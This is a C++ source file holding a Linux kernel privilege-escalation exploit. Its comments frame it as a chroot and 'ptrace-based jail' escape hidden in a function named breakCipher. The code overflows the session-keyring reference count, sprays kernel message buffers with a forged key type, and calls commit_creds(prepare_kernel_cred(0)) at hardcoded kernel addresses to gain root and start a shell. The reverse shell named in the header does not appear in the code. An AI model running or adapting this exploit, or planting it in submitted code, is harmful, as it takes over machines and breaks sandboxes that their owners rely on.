/**
	attempts to escape chroot and then open a reverse shell
**/

#include <iostream>
#include <cstring>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <string>
#include <iostream>
#include <netinet/ip.h>
#include <iostream>
#include <cstring>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/resource.h>
#include <sys/mman.h>
#include <arpa/inet.h>
#include <syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>

typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

#define STRUCT_LEN (0xb8 - 0x30)
#define COMMIT_CREDS_ADDR (0xffffffff81094250)
#define PREPARE_KERNEL_CREDS_ADDR (0xffffffff81094550)

struct key_type {
	char * name;
	size_t datalen;
	void * vet_description;
	void * preparse;
	void * free_preparse;
	void * instantiate;
	void * update;
	void * match_preparse;
	void * match_free;
	void * revoke;
	void * destroy;
};

void userspace_revoke(void * key) {
	commit_creds(prepare_kernel_cred(0));
}

using namespace std;

void breakCipher(char *str) {
	//break out of the ptrace-based jail
	pid_t pid = vfork();
	if (pid < 0) {
		strcpy(str, "V1");
		return;
	}

	if (pid == 0) {
		//V1 child
		const char *keyring_name;
		size_t i = 0;
		unsigned long int l = 0x100000000 / 2;
		int serial = -1;
		pid_t pid = -1;
		struct key_type * my_key_type = NULL;

		struct {
			long mtype;
			char mtext[STRUCT_LEN];
		} msg = { 0x4141414141414141,{ 0 } };
		int msqid;

		printf("uid=%d, euid=%d\n", getuid(), geteuid());
		commit_creds = (_commit_creds)COMMIT_CREDS_ADDR;
		prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CREDS_ADDR;

		my_key_type = (key_type*)malloc(sizeof(*my_key_type));

		my_key_type->revoke = (void*)userspace_revoke;
		memset(msg.mtext, 'A', sizeof(msg.mtext));

		// key->uid
		*(int*)(&msg.mtext[56]) = 0x3e8; /* geteuid() */
										 //key->perm
		*(int*)(&msg.mtext[64]) = 0x3f3f3f3f;

		//key->type
		*(unsigned long *)(&msg.mtext[80]) = (unsigned long)my_key_type;

		if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
			perror("msgget");
			exit(1);
		}

		keyring_name = "keyring-r-attack";

		serial = syscall(SYS_keyctl, 0x1 /*KEYCTL_JOIN_SESSION_KEYRING*/, keyring_name);
		if (serial < 0) {
			cout << strerror(errno) << endl;
			_exit(0);
		}

		int ret = syscall(SYS_keyctl, 0x5 /*KEYCTL_SETPERM*/, serial, 0x3f3f3f3f /*all*/);
		if (ret < 0) {
			cout << strerror(errno) << endl;
			_exit(0);
		}

		puts("Increfing...");
		for (i = 1; i < 0xfffffffd; i++) {
			if (i == (0xffffffff - l)) {
				l = l / 2;
				sleep(5);
			}
			if (syscall(SYS_keyctl, 0x1 /*KEYCTL_JOIN_SESSION_KEYRING*/, keyring_name) < 0) {
				perror("keyctl");
				_exit(0);
			}
		}

		sleep(5);
		/* here we are going to leak the last references to overflow */
		for (i = 0; i<5; ++i) {
			if (syscall(SYS_keyctl, 0x1 /*KEYCTL_JOIN_SESSION_KEYRING*/, keyring_name) < 0) {
				perror("keyctl");
				_exit(0);
			}
		}

		puts("finished increfing");
		puts("forking...");
		/* allocate msg struct in the kernel rewriting the freed keyring object */
		for (i = 0; i<64; i++) {
			pid = fork();
			if (pid == -1) {
				perror("fork");
				_exit(0);
			}

			if (pid == 0) {
				sleep(2);
				if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
					perror("msgget");
					exit(1);
				}
				for (i = 0; i < 64; i++) {
					if (msgsnd(msqid, &msg, sizeof(msg.mtext), 0) == -1) {
						perror("msgsnd");
						exit(1);
					}
				}
				sleep(-1);
				exit(1);
			}
		}

		puts("finished forking");
		sleep(5);

		/* call userspace_revoke from kernel */
		puts("caling revoke...");
		if (syscall(SYS_keyctl, 0x3 /*KEYCTL_REVOKE*/, -3 /*KEY_SPEC_SESSION_KEYRING*/) == -1) {
			perror("keyctl_revoke");
		}
		_exit(0);

		printf("uid=%d, euid=%d\n", getuid(), geteuid());
		execl("/bin/sh", "/bin/sh", NULL);
	}
	else {
		//V1 parent
	}
	
}
